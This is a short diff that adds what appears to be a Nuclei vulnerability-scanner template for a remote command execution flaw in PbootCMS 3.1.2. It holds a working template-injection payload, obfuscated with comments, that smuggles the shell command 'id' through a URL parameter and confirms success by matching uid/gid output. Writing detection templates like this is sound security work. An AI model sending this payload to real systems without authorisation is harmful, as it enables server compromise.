@@ -1,0 +1,20 @@
+id: pbootcms-3-1-2-rce
+info:
+  name: PbootCMS 3.1.2 Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce
+  metadata:
+    finger: PbootCMS
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?snakin=}{pboot:if((get_lg/*-*/())/**/(get_backurl/*-*/()))}{/pboot:if}&backurl=;id"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "groups="
+          - "gid="
